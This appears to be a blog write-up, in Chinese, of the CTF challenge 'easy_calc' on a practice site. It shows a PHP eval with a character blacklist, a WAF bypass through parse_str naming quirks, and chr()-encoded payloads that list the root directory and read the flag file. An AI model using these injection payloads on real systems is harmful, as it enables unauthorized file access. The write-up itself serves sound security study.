---
title: buuoj刷题记录2
date: 2019-12-26 20:16:12
tags:
 - ctf
 - Roarctf
 - web
 - buuctf
categories: 
 - 刷题记录
---

## [Roarctf]easy_calc

### 0x00 基础

php内置读取文件内容函数

```php
file_get_contents()
readfile()
file()
```

目录扫描函数

```php
scandir()
```

<!--more-->

字符转换函数

```php
hex2bin("979797")->"aaa"
chr(95)->"a"
```

输出函数

```php
var_dump()
printf()
```

`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf

### 0x01 分析

查看源码，发现calc.php

```php
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```

进入calc.php,进行代码审计。

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {    
                        die("what are you want to do?");//如果包含黑名单中的字符，程序退出
                }
        }
        eval('echo '.$str.';');
}
?> 
```

### 0x02 开始操作

传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入url编码后的。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，详细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。

扫描目录使用`scandir()`因为`/ '  "`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`

```php
Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1
```

使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

```
flag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43
```

